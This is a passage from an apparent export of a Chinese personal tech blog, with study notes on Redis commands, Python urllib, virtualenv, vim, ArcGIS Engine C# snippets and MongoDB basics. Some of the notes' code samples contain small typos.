每次执行将value的数字减1DECR age 全局Key操作：12345keys * # 查看所有的键DEL keyEXISTS keyRENAME old_key new_keyTYPE key Hash:哈希（字段里面也有值）Hashes类型看成具有String Key和String Value的map容器。 123456类似于这种结构：b = &#123; one:xps two:xp three:x&#125; 123456789101112131415161718# 设置该key字段的值HSET key field valueHSET b one xpsHSET b one xps two xp three x# 获取该key字段的值HGET key fieldHGET b one# 获取hash表里面所有的值HVALS keyHvals b# 获取hash表里面所有的字段Hkeys b# 获取hash表中的字段数量HLEN b List类型（例如：微博评论）List类型是按照插入顺序排序的字符串链表。在插入时，如果该键并不存在，Redis将为该键创建一个新的链表 123456789101112131415161718192021# 向列表头部插入数据（顺序：c,b,a）LPUSH names a b c# 插入数据（x,y,z）RPUSh names2 x y z# 获取列表里面某个索引对应的值LINDEX key indexLINDEX names 0# 弹出并删除最后一个元素RPOP names# 弹出并删除最前面一个元素LPOP names# 列表的长度LLEN key#LSET key index value Set类型(微博粉丝，关注人)Set类型没有排序的字符集合。如果多次添加相同元素，Set中将仅保留该元素的一份拷贝。 1234567891011121314151617# 向集合添加成员SADD setkey a b c d # 查看集合成员数量SCARD key# 迭代集合中的所有元素SMEMBERS keySMEMBERS setkey# 判断集合是否存在该元素(存在为1，不存在为0)SMEMBERS key valueSMEMBERS setkey aSMEMBERS setkey z #删除并返回集合中的一个随机元素 SPOP setkey Sorted Set类型（排行榜，top,直播）每一个成员都会有一个分数(score)(权重)与之关联。成员是唯一的，但是分数(score)却是可以重复的。 123456789101112131415# 向有序集合添加成员，并且给他权重ZADD key score1 member1 [score2 member2]ZADD akey 1 a 2 b 3 c# 显示集合成员数ZCARD zkey# 计算有序集合指定区的分数的成员数ZCOUNT zkey 1 3# 移除有序集合一个或多个成员ZREM zkey number# 查找 迭代有序集合所有元素ZSCAN zkeys ###]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[urllib库的基本使用]]></title>
    <url>%2FUrllib%E5%BA%93%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[urllib是Python自带的标准库，无需安装，直接可以用。 提供了如下功能： 网页请求 响应获取 代理和cookie设置 异常处理 URL解析 爬虫所需要的功能，基本上在urllib中都能找到，学习这个标准库，可以更加深入的理解后面更加便利的requests库。 urllib库 urlopen 语法 123urllib.request.urlopen(url,data=None,[timeout,]*,cafile=None,capath=None,cadefault=False,context=None)#url:访问的网址#data:额外的数据，如header，form data 用法 123456789101112131415161718192021222324252627# request:GETimport urllib.requestresponse = urllib.request.urlopen(&apos;http://www.baidu.com&apos;)print(response.read().decode(&apos;utf-8&apos;))# request: POST# http测试：http://httpbin.org/import urllib.parseimport urllib.requestdata = bytes(urllib.parse.urlencode(&#123;&apos;word&apos;:&apos;hello&apos;&#125;),encoding=&apos;utf8&apos;)response = urllib.request.urlopen(&apos;http://httpbin.org/post&apos;,data=data)print(response.read())# 超时设置import urllib.requestresponse = urllib.request.urlopen(&apos;http://httpbin.org/get&apos;,timeout=1)print(response.read())import socketimport urllib.requestimport urllib.errortry: response = urllib.request.urlopen(&apos;http://httpbin.org/get&apos;,timeout=0.1)except urllib.error.URLError as e: if isinstance(e.reason,socket.timeout): print(&apos;TIME OUT&apos;) 响应12345678910# 响应类型import urllib.openresponse = urllib.request.urlopen(&apos;https:///www.python.org&apos;)print(type(response))# 状态码， 响应头import urllib.requestresponse = urllib.request.urlopen(&apos;https://www.python.org&apos;)print(response.status)print(response.getheaders()) # 获取响应头print(response.getheader(&apos;Server&apos;)) # 得到指定的响应头 Request 声明一个request对象，该对象可以包括header等信息，然后用urlopen打开。 1234567891011121314151617181920212223242526272829303132# 简单例子import urllib.requestrequest = urllib.request.Requests(&apos;https://python.org&apos;)response = urllib.request.urlopen(request)print(response.read().decode(&apos;utf-8&apos;))# 增加headerfrom urllib import request, parseurl = &apos;http://httpbin.org/post&apos;headers = &#123; &apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos; &apos;Host&apos;:&apos;httpbin.org&apos;&#125;# 构造POST表格dict = &#123; &apos;name&apos;:&apos;Germey&apos;&#125;data = bytes(parse.urlencode(dict),encoding=&apos;utf8&apos;)req = request.Request(url=url,data=data,headers=headers,method=&apos;POST&apos;)response = request.urlopen(req)print(response.read()).decode(&apos;utf-8&apos;)# 或者随后增加headerfrom urllib import request, parseurl = &apos;http://httpbin.org/post&apos;dict = &#123; &apos;name&apos;:&apos;Germey&apos;&#125;req = request.Request(url=url,data=data,method=&apos;POST&apos;)req.add_hader(&apos;User-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36&apos;)response = request.urlopen(req)print(response.read().decode(&apos;utf-8&apos;)) Handler：处理更加复杂的页面 代理 12345678import urllib.requestproxy_handler = urllib.request.ProxyHandler(&#123; &apos;http&apos;:&apos;http://127.0.0.1:9743&apos; &apos;https&apos;:&apos;https://127.0.0.1.9743&apos;&#125;)opener = urllib.request.build_openner(proxy_handler)response = opener.open(&apos;http://www.baidu.com&apos;)print(response.read()) Cookie:客户端用于记录用户身份,维持登录信息 1234567891011121314151617181920212223242526272829import http.cookiejar, urllib.requestcookie = http.cookiejar.CookieJar()handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)for item in cookie: print(item.name+&quot;=&quot;+item.value)# 保存cooki为文本import http.cookiejar, urllib.requestfilename = &quot;cookie.txt&quot;# 保存类型有很多种## 类型1cookie = http.cookiejar.MozillaCookieJar(filename)## 类型2cookie = http.cookiejar.LWPCookieJar(filename)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;)# 使用相应的方法读取import http.cookiejar, urllib.requestcookie = http.cookiejar.LWPCookieJar()cookie.load(&apos;cookie.txt&apos;, ignore_discard=True, ignore_expires=True)handler = urllib.request.HTTPCookieProcessor(cookie)opener = urllib.request.build_opener(handler)response = opener.open(&quot;http://www.baidu.com&quot;) 异常处理 捕获异常，保证程序稳定运行 12345678910111213141516171819202122232425262728# 访问不存在的页面from urllib import request, errortry: response = request.urlopen(&apos;http://cuiqingcai.com/index.htm&apos;)except error.URLError as e: print(e.reason)# 先捕获子类错误from urllib imort request, errortry: response = request.urlopen(&apos;http://cuiqingcai.com/index.htm&apos;)except error.HTTPError as e: print(e.reason, e.code, e.headers, sep=&apos;\n&apos;)except error.URLError as e: print(e.reason)else: print(&quot;Request Successfully&apos;) # 判断原因import socketimport urllib.requestimport urllib.errortry: response = urllib.request.urlopen(&apos;http://httpbin.org/get&apos;,timeout=0.1)except urllib.error.URLError as e: if isinstance(e.reason, socket.timeout): print(&apos;TIME OUT&apos;) URL解析 主要是一个工具模块，可用于为爬虫提供URL。 12345urlparse:拆分URLurlib.parse.urlparse(urlstring,scheme=&apos;&apos;, allow_fragments=True)# scheme: 协议类型# 是否忽略’#‘部分 举个例子1234from urllib import urlparseresult = urlparse(&quot;https://edu.hellobi.com/course/157/play/lesson/2580&quot;)result##ParseResult(scheme=&apos;https&apos;, netloc=&apos;edu.hellobi.com&apos;, path=&apos;/course/157/play/lesson/2580&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;) urlunparse:拼接URL，为urlparse的反向操作123from urllib.parse import urlunparsedata = [&apos;http&apos;,&apos;www.baidu.com&apos;,&apos;index.html&apos;,&apos;user&apos;,&apos;a=6&apos;,&apos;comment&apos;]print(urlunparse(data)) urljoin:拼接两个URL urljoin urlencode:字典对象转换成GET请求对象12345678from urllib.parse import urlencodeparams = &#123; &apos;name&apos;:&apos;germey&apos;, &apos;age&apos;: 22&#125;base_url = &apos;http://www.baidu.com?&apos;url = base_url + urlencode(params)print(url) 最后还有一个robotparse，解析网站允许爬取的部分。]]></content>
      <categories>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>python</tag>
        <tag>urllib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[virtualenv]]></title>
    <url>%2Fvirtualenv%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[12# 腾讯云的源有时候不行，可以更换源pip3 install virtualenv -i https://pypi.doubanio.com/simple/ --user 搭建虚拟环境 先安装 virtualenv, 再安装 virtualenvwrapper 12pip install virtaulenvpip install virtualenvwrapper 设置虚拟的环境变量 . 先找到 virtualenvwrapper.sh 文件 1find / -name "virtualenvwrapper.sh" 写入 .bashrc 文件 12export WORKON_HOME=$HOME/.virtualenvs source 这里写起前面找出来的文件 基本命令 12345678910# 创建虚拟环境mkvirtualenv pyenv# 删除虚拟机环境rmvirtualenv pyenv# 进入虚拟环境workon pyenv# 推出虚拟环境deactivate# 创建虚拟环境的是时候，指定 Python 版本mkvirtualenv 如果报如下错误： 1ERROR: virtualenvwrapper could not find virtualenv in your path 因为是被安装在默认的Python目录下，添加软链接即可 1ln -s /usr/bin/python36/bin/virtualenv /usr/local/bin/virtualenv 批处理安装库：requirements.txtpip freeze 冻结出所有包与版本号 导出：pip freeze &gt; requirements.txt 再安装: pip install -r requirements.txt 虚拟环境： windows激活虚拟环境 ：pycharm自动激活12cd 虚拟环境目录venv/Scripts/active linux激活虚拟环境 ：source ./venv/bin/active]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>virtualenv</tag>
        <tag>虚拟环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim基本命令]]></title>
    <url>%2Fvim%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[三种模式: 一般命令模式(默认,按住esc进入) 命令模式 编辑模式 h 左 j 下 l 右 k 上 w 移动到下一个单词词首 e 移动到下一个单词词尾 b 移动到上一个单词词首 2.进入插入模式 i 在当前光标出处编辑 I 大写的i 在行首插入 A 在行末插入 a 在光标后插入编辑 o 在当前行后插入一个新行 O 在当前行前插入一个新行 cw 替换从光标所在位置后到一个单词结尾的字符 3.1命令行模式下退出vim 命令 说明 :q! 强制退出，不保存 :q 退出 :wq! 强制保存并退出 :w &lt;文件路径&gt; 另存为 :saveas 文件路径 另存为 :x 保存并退出 :wq 保存并退出 3.2普通模式下退出vim普通模式下输入Shift+zz即可保存退出vim 4. 普通模式下删除vim文本信息进入普通模式，使用下列命令可以进行文本快速删除： 命令 说明 x 删除游标所在的字符 X 删除游标所在前一个字符 Delete 同x dd 删除整行 dw 删除一个单词（不适用中文） d$或D 删除至行尾 d^ 删除至行首 dG 删除到文档结尾处 d1G 删至文档首部 除此之外，你还可以在命令之前加上数字，表示一次删除多行，如： 2dd表示一次删除2行 2.1.1 重复执行上次命令在普通模式下.(小数点)表示重复上一次的命令操作 普通模式下输入x，删除第一个字符，输入.(小数点)会再次删除一个字符，除此之外也可以重复dd的删除操作 2.1.2 执行指定次数相同的命令进入普通模式输入N&lt;command&gt;，N 表示重复后面的次数，下面来练习： 打开文件文件进行编辑 1$ vim protocols 下面你可以依次进行如下操作练习： 输入10x，删除10个连续字符 输入3dd，将会删除3行文本 在普通模式下，你还可以使用dw或者daw(delete a word)删除一个单词，所以你可以很容易的联想到dnw(n替换为相应数字) 表示删除n个单词 2.2.1 行间跳转 命令 说明 nG(n Shift+g) 游标移动到第 n 行(如果默认没有显示行号，请先进入命令模式，输入:set nu以显示行号) gg 游标移动到到第一行 G(Shift+g) 到最后一行 你在完成依次跳转后，可以使用 Ctrl+o 快速回到上一次(跳转前)光标所在位置,这个技巧很实用，比如当你在写代码时，忽然想起有个 bug，需要修改，这时候你跳过去改好了，只需要按下 Ctrl+o 就可以回到你之前的位置。vim 中会用很多类似的小技巧就等着你去发掘。 2.2.2 行内跳转普通模式下使用下列命令在行内按照单词为单位进行跳转 命令 说明 w 到下一个单词的开头 e 到当前单词的结尾 b 到前一个单词的开头 ge 到前一个单词的结尾 0或^ 到行头 $ 到行尾 f&lt;字母&gt; 向后搜索&lt;字母&gt;并跳转到第一个匹配的位置(非常实用) F&lt;字母&gt; 向前搜索&lt;字母&gt;并跳转到第一个匹配的位置 t&lt;字母&gt; 向后搜索&lt;字母&gt;并跳转到第一个匹配位置之前的一个字母(不常用) T&lt;字母&gt; 向前搜索&lt;字母&gt;并跳转到第一个匹配位置之后的一个字母(不常用) 使用 ~ 将游标所在字母变成大写或小写 2.3.1 复制及粘贴文本 普通模式中使用y复制 普通模式中，yy复制游标所在的整行（3yy表示复制3行） 普通模式中，y^ 复制至行首，或y0。不含光标所在处字符。 普通模式中，y$ 复制至行尾。含光标所在处字符。 普通模式中，yw 复制一个单词。 普通模式中，y2w 复制两个单词。 普通模式中，yG 复制至文本末。 普通模式中，y1G 复制至文本开头。 普通模式中使用 p 粘贴 普通模式中，p(小写)代表粘贴至光标后（下） 普通模式中，P(大写)代表粘贴至光标前（上） 2.3.2 剪切及粘贴其实前面讲得 dd 删除命令就是剪切，你每次 dd 删除文档内容后，便可以使用 p 来粘贴，也这一点可以让我们实现一个很爽快的功能——交换上下行： ddp ,就这么简单，即实现了快速交换光标所在行与它下面的行 2.1.1 替换和撤销(Undo)命令替换和Undo命令都是针对普通模式下的操作 命令 说明 r+&lt;待替换字母&gt; 将游标所在字母替换为指定字母 R 连续替换，直到按下Esc cc 替换整行，即删除游标所在行，并进入插入模式 cw 替换一个单词，即删除一个单词，并进入插入模式 C(大写) 替换游标以后至行末 ~ 反转游标所在字母大小写 u{n} 撤销一次或n次操作 U(大写) 撤销当前行的所有修改 Ctrl+r redo，即撤销undo的操作 输入2G，跳转到 2 行 2.2.1 使用命令进行快速调整缩进操作这一小节学习如何在vim中进行快速缩进，缩进操作均在普通模式下有效 打开文件进行编辑 1$ vim protocols 普通模式下输入15G，跳转到15行 普通模式下输入&gt;&gt; 整行将向右缩进（使用，用于格式化代码超爽） 普通模式下输入&lt;&lt; 整行向左回退 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 2.2.2 shiftwidth命令shiftwidth命令是指上一节&gt;&gt;命令产生的缩进（可以简写成sw） 普通模式下输入:进入命令行模式下对shiftwidth值进行设置可以控制缩进和回退的字符数 获取目前的设定值 1:set shiftwidth? 设置缩进为10个字符 1:set shiftwidth=10 输入 ESC 回到普通模式，再次尝试 &gt;&gt; 看缩进量是否变化 2.2.3 调整文本位置命令行模式下输入:ce(center)命令使本行内容居中 1:ce 命令行模式下输入:ri(right)命令使本行文本靠右 1:ri 命令行模式下输入:le(left)命令使本行内容靠左 1:le 2.3.1 快速查找普通模式下输入 / 然后键入需要查找的字符串 按回车后就会进行查找。？ 与/ 功能相同，只不过 ？ 是向上而 / 是向下查找。 进入查找之后，输入n 和 N 可以继续查找 n表示继续查找，N 反向查找 2.3.2 快速查找练习使用 vim 打开文件进行编辑（搜索高亮需要在配置文件 .vimrc 中设置 set hls ，实验环境中已经设置好了） 1$ vim protocols 普通模式下输入/icmp然后回车即可查找字符串 icmp 普通模式下输入n查找下一个 icmp 普通模式下输入？tcp向上查找字符串 tcp 普通模式下输入N查找上一个出现的 tcp 命令行模式下输入 noh 然后回车即可取消搜索 2.3.3 高级查找 普通模式下输入\*寻找游标所在处的单词 普通模式下输入\#同上，但 \# 是向前（上）找，\*则是向后（下）找 普通模式下输入g\*同\* ，但部分符合该单词即可 普通模式下输入g\#同\# ，但部分符合该单词即可 以上查找n,N 的继续查找命令依然可以用 2.1.1 使用vim编辑多个文件编辑多个文件有两种形式，一种是在进入vim前使用的参数就是多个文件。另一种就是进入vim后再编辑其他的文件。 同时创建两个新文件并编辑 1$ vim 1.txt 2.txt 默认进入1.txt文件的编辑界面 命令行模式下输入 :n 编辑 2.txt 文件，可以加 ! 即 :n! 强制切换，之前一个文件的输入没有保存，仅仅切换到另一个文件 命令行模式下输入 :N 编辑 1.txt 文件，可以加 ! 即 :N! 强制切换，之前文件内的输入没有保存，仅仅是切换到另一个文件 2.1.2 进入vim后打开新文件 命令行模式下输入:e 3.txt 打开新文件3.txt 命令行模式下输入:e# 回到前一个文件 命令行模式下输入:ls可以列出以前编辑过的文档 命令行模式下输入:b 2.txt（或者编号）可以直接进入文件2.txt编辑 命令行模式下输入:bd 2.txt（或者编号）可以删除以前编辑过的列表中的文件项目 命令行模式下输入:e! 4.txt，新打开文件4.txt，放弃正在编辑的文件 命令行模式下输入:f 显示正在编辑的文件名 命令行模式下输入:f new.txt，改变正在编辑的文件名字为new.txt 2.1.3 恢复文件 由于在线环境的特殊性，请在本机尝试 如果因为断电等原因造成文档没有保存，可以采用恢复方式，vim -r进入文档后，输入:ewcover 1.txt来恢复 1$ vim -r 1.txt 2.2.1 可视模式命令简介 在普通模式下输入 v（小写），进入字符选择模式，就可以移动光标，光标走过的地方就会选取。再次按下v会后就会取消选取。 在普通模式下输入 Shift+v（小写），进入行选择模式，按下V之后就会把整行选取，您可以上下移动光标选更多的行，同样，再按一次 Shift+v 就可以取消选取。 在普通模式下输入 Ctrl+v（小写），这是区域选择模式，可以进行矩形区域选择，再按一次 Ctrl+v 取消选取。 在可视模式下输入 d 删除选取区域内容 在可视模式下输入y复制选取区域内容 2.3.1 视窗操作简介vim 可以在一个界面里打开多个窗口进行编辑，这些编辑窗口称为 vim 的视窗。 打开方法有很多种，例如可以使用在命令行模式下输入 :new 打开一个新的 vim 视窗，并进入视窗编辑一个新文件（普通模式下输入 Ctrl+w也可以），除了 :new 命令，下述列举的多种方法也可以在命令模式或普通模式下打开新的视窗： 注意：快捷键可能会与浏览器的快捷键冲突，可换为 IE 浏览器进行实验或者在浏览器设置里禁用浏览器快捷键。 命令行模式下输入:sp 1.txt 打开新的水平分屏视窗来编辑1.txt 命令行模式下输入:vsp 2.txt 打开新的垂直分屏视窗来编辑2.txt 普通模式下Ctrl+w s 将当前窗口分割成两个水平的窗口 普通模式下Ctrl+w v 将当前窗口分割成两个垂直的窗口 普通模式下Ctrl+w q 即 :q 结束分割出来的视窗。如果在新视窗中有输入需要使用强制符！即:q! 普通模式下Ctrl+w o 打开一个视窗并且隐藏之前的所有视窗 普通模式下Ctrl+w j 移至下面视窗 普通模式下Ctrl+w k 移至上面视窗 普通模式下Ctrl+w h 移至左边视窗 普通模式下Ctrl+w l 移至右边视窗 普通模式下Ctrl+w J 将当前视窗移至下面 普通模式下Ctrl+w K 将当前视窗移至上面 普通模式下Ctrl+w H 将当前视窗移至左边 普通模式下Ctrl+w L 将当前视窗移至右边 普通模式下Ctrl+w - 减小视窗的高度 普通模式下Ctrl+w + 增加视窗的高度 2.4.1 创建加密文档1$ vim -x file1 输入您的密码 确认密码 这样在下一次打开时，vim就会要求你输入密码 在命令行模式中输入!可以执行外部的shell命令 :!ls 用于显示当前目录的内容 :!rm FILENAME用于删除名为 FILENAME 的文件 :w FILENAME可将当前 VIM 中正在编辑的文件另存为 FILENAME 文件 2.7.1 vim的功能设定可以在编辑文件的时候进行功能设定，如命令行模式下输入:set nu（显示行数），设定值退出vim后不会保存。要永久保存配置需要修改vim配置文件。 vim的配置文件~/.vimrc(实验楼环境中配置文件在/etc/vim/vimrc)，可以打开文件进行修改，不过务必小心不要影响vim正常使用 2.7.2 获取目前的设定 命令行模式下输入:set或者:se显示所有修改过的配置 命令行模式下输入:set all 显示所有的设定值 命令行模式下输入:set option? 显示option的设定值 命令行模式下输入:set nooption 取消当前设定值 2.7.3 set功能的说明 命令行模式下输入:set autoindent(ai) 设置自动缩进 命令行模式下输入:set autowrite(aw) 设置自动存档，默认未打开 命令行模式下输入:set background=dark或light，设置背景风格 命令行模式下输入:set backup(bk) 设置自动备份，默认未打开 命令行模式下输入: set cindent(cin) 设置C语言风格缩进 更多详细参数请参考vim手册 12345678910111213141516ctrl + f # 向后翻一页ctrl + b # 向前翻一页ZZ # 保存修改并且退出D # 删除光标到行尾内容 /字符串 # 向前搜索关键字?name # 向后搜索关键字:149,$s/iii/xxx/gc # 替换指定行的iii为xxx, 全局替换,c是确认提示:150 # 跳到150行e a.txt # 打开并编辑指定文件:n # 编辑下一个文件:f # 显示当前的文件名]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngine鹰眼功能]]></title>
    <url>%2FArcgisEngine%20%E9%B9%B0%E7%9C%BC%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[12345678910111213141516// 鹰眼视图功能 ...// OnMapReplaced当mapcontrol1中的地图被替换时，该方法自动加载主空间中所有的图层对象到鹰眼private void mainMapControl_OnMapReplaced(object sender, IMapControlEvents2_OnMapReplacedEvent e)&#123; if (mainMapControl.Map.LayerCount &gt; 0) &#123; for (int i = 0; i &lt; mainMapControl.Map.LayerCount; i++) &#123; // 加载 eyeMapControl.AddLayer(mainMapControl.get_Layer(i)); &#125; // 鹰眼视图的范围等于mainMap当前的范围 eyeMapControl.Extent = mainMapControl.Extent; eyeMapControl.ActiveView.Refresh(); &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738//鹰眼功能 范围更新// //--2、在主控件中使用鼠标拖拽视图的时候，鹰眼控件中出现红色矩形框//--2、该方法发生在主视图的范围发生变换后，private void mainMapControl_OnExtentUpdated(object sender, IMapControlEvents2_OnExtentUpdatedEvent e)&#123; IEnvelope pEnvelope = (IEnvelope)e.newEnvelope; IGraphicsContainer pGraphicsContainer = eyeMapControl.Map as IGraphicsContainer; IActiveView pActiveView = pGraphicsContainer as IActiveView; pGraphicsContainer.DeleteAllElements(); IRectangleElement pRectangleEle = new RectangleElementClass(); IElement pElement = pRectangleEle as IElement; pElement.Geometry = pEnvelope; IRgbColor pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 255; ILineSymbol pOutline = new SimpleLineSymbolClass(); pOutline.Width = 3; pOutline.Color = pColor; pColor = new RgbColorClass(); pColor.Red = 255; pColor.Green = 0; pColor.Blue = 0; pColor.Transparency = 0; IFillSymbol pFillSymbol = new SimpleFillSymbolClass(); pFillSymbol.Color = pColor; pFillSymbol.Outline = pOutline; IFillShapeElement pFillShapeEle = pElement as IFillShapeElement; pFillShapeEle.Symbol = pFillSymbol; pGraphicsContainer.AddElement((IElement)pFillShapeEle, 0); pActiveView.PartialRefresh(esriViewDrawPhase.esriViewGraphics, null, null);&#125; 123456789101112131415161718192021// 鹰眼视图功能 鹰眼视图点击=》主图范围跟着变化private void eyeMapControl_OnMouseDown(object sender, IMapControlEvents2_OnMouseDownEvent e)&#123; // 如果被点击 if (e.button == 1) &#123; IPoint point = new ESRI.ArcGIS.Geometry.Point(); //获取点击鹰眼视图的点击的位置 point.PutCoords(e.mapX, e.mapY); // 主图的中心位于点击的点point上 mainMapControl.CenterAt(point); mainMapControl.ActiveView.Refresh(); &#125; // 如果是右键 else if (e.button == 2) &#123; IEnvelope pEnv = eyeMapControl.TrackRectangle(); mainMapControl.Extent = pEnv; mainMapControl.ActiveView.Refresh(); &#125;&#125; 12345678910private void eyeMapControl_OnMouseMove(object sender, IMapControlEvents2_OnMouseMoveEvent e)&#123; if (e.button == 1) &#123; IPoint pPoint = new PointClass(); pPoint.PutCoords(e.mapX, e.mapY); mainMapControl.CenterAt(pPoint); mainMapControl.ActiveView.Refresh(); &#125;&#125;]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>C#</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcEngine文件保存功能]]></title>
    <url>%2FArcgisEngine%20%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%9D%E5%AD%98%E4%B8%8E%E5%8F%A6%E5%AD%98%2F</url>
    <content type="text"><![CDATA[地图文档保存问题：空文档也能保存12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849private void saveToolStrip_Click(object sender, EventArgs e) &#123; try &#123; string sMxdFileName = mainMapControl.DocumentFilename; IMapDocument pMapDocument = new MapDocumentClass(); //检查文档是否为空以及有效性 if (sMxdFileName != null &amp;&amp; mainMapControl.CheckMxFile(sMxdFileName)) &#123; if (pMapDocument.get_IsReadOnly(sMxdFileName)) &#123; MessageBox.Show("地图本当为只读，不能保存！"); pMapDocument.Close(); return; &#125; else &#123; SaveFileDialog pSaveFileDialog = new System.Windows.Forms.SaveFileDialog(); pSaveFileDialog.Title = "请选择保存路径"; pSaveFileDialog.Filter = "ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt"; //当相同的文件存在是提示错误 pSaveFileDialog.OverwritePrompt = true; pSaveFileDialog.RestoreDirectory = true; if (pSaveFileDialog.ShowDialog() == DialogResult.OK) &#123; //获取名字 sMxdFileName = pSaveFileDialog.FileName; &#125; else &#123; return; &#125; pMapDocument.New(sMxdFileName); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); //保存为绝对路径 pMapDocument.Save(pMapDocument.UsesRelativePaths, true); pMapDocument.Close(); MessageBox.Show("保存文档成功"); &#125; &#125; &#125; catch (Exception ex) &#123; MessageBox.Show(ex.Message); &#125; &#125; 地图文档另存为1123456789101112131415161718192021222324private void saveAsToolStrip_Click(object sender, EventArgs e) &#123; try &#123; SaveFileDialog pSaveDialog = new System.Windows.Forms.SaveFileDialog(); pSaveDialog.Title = "另存为"; pSaveDialog.OverwritePrompt = true;//当相同的文件存在是提示错误 pSaveDialog.Filter = "ArcMap文档(*.mxd)|*.mxd|ArcMap模板(*.mxt)|*.mxt"; pSaveDialog.RestoreDirectory = true; if (pSaveDialog.ShowDialog() == DialogResult.OK) &#123; string sFilePath = pSaveDialog.FileName; IMapDocument pMapDocument = new MapDocumentClass(); pMapDocument.New(sFilePath); pMapDocument.ReplaceContents(mainMapControl.Map as IMxdContents); pMapDocument.Save(true, true); pMapDocument.Close(); &#125; &#125; catch (Exception ex) &#123; MessageBox.Show(ex.Message); &#125; &#125; 地图另存为2123ICommand command = new ControlsSaveAsDocCommandClass();command.OnCreate(mainMapControl.Object);command.OnClick();]]></content>
      <categories>
        <category>GIS</category>
      </categories>
      <tags>
        <tag>ArcEngine</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MongoDB初试及基本操作]]></title>
    <url>%2FMongoDB%E5%88%9D%E8%AF%86%E5%8F%8A%E5%BA%93%E7%BA%A7%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[#### 分布式： 一个任务分成多个子任务完成 （副手） 集群：一个任务由多态服务器同时服务 大数据 文档结构，海量数据，大容量存储，高校存储大量二进制文件 场景： 1.需要不断扩容； 2.新应用，需求会变，数据模型无法确定； 3.高可用（不宕机） 4.需要整合多个外部数据源 SQL术语 MongoDB术语 解释说明 database database 数据库 table collection 数据库表/集合 row document 数据记录行/文档 column field 字段/域 index index 索引 table joins 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 文档：就是一个对象，由键值对构成，是json的一种扩展 Bson形式 字段(域)之间可以是不同类型: {‘book’:’xxx’, ‘hero’:’yyy’}` {&#39;name&#39;:&#39;sjz&#39;, &#39;age&#39;:18} 下载完成后，将可执行文件添加到PATH路径中 export PATH=/user/local/mondodb/bin:$PATH 服务端mongod 配置文件位置 etc/mongod.conf 默认端口 27017 查看端口： 1ss -tnl 数据库服务启动/停止/重启 1sudo service mongodb start/stop/restart 查看状态： 1sudo service mongodb status 客户端启动 1mongo 连接mongodb: 1234# 进入mongo # 退出exit 或者 ctrl + c 或 quit() 数据库级操作：1.查看所有数据库 1show dbs 2.创建数据库 123use mydb# 创建之后，如果不插入数据的话， show dbs是看不到刚建立的数据库的 3.显示当前数据库 1db 4.删除数据库 1db.dropDatabase() # 注意大小写]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArcgisEngine实现地图浏览]]></title>
    <url>%2FArcEngine%E5%9C%B0%E5%9B%BE%E6%B5%8F%E8%A7%88%E5%8A%9F%E8%83%BD%2F</url>
    <content type="text"><![CDATA[全图12345private void FullExtentTSButton_Click(object sender, EventArgs e) &#123; mainMapControl.Extent = mainMapControl.FullExtent; &#125; 等比例放大123456789private void btnZoomInStep_Click(object sender, EventArgs e)&#123; IEnvelope pEnvelope; pEnvelope = mainMapControl.Extent; pEnvelope.Expand(0.5, 0.5, true); //放大2倍 mainMapControl.Extent = pEnvelope; mainMapControl.ActiveView.Refresh();&#125; 等比例缩小1234567891011121314151617181920private void btnZoomIOutStep_Click(object sender, EventArgs e)&#123; IActiveView pActiveView = mainMapControl.ActiveView; IPoint centerPoint = new PointClass(); centerPoint.PutCoords((pActiveView.Extent.XMin + pActiveView.Extent.XMax) / 2, (pActiveView.Extent.YMax + pActiveView.Extent.YMin) / 2); IEnvelope envlop = pActiveView.Extent; envlop.Expand(1.5, 1.5, true); //与放大的区别在于Expand的参数不同 pActiveView.Extent.CenterAt(centerPoint); pActiveView.Extent = envlop; pActiveView.Refresh(); //如果觉得乱的话，直接修改放大的参数也将就可以 非万不得已不用 //IEnvelope pEnvelope; //pEnvelope = mainMapControl.Extent; //pEnvelope.Expand(1.5, 1.5, true); //放大2倍 //mainMapControl.Extent = pEnvelope; //mainMapControl.ActiveView.Refresh();&#125; 上一视图123456789101112131415161718// 定义全局变量IExtentStack 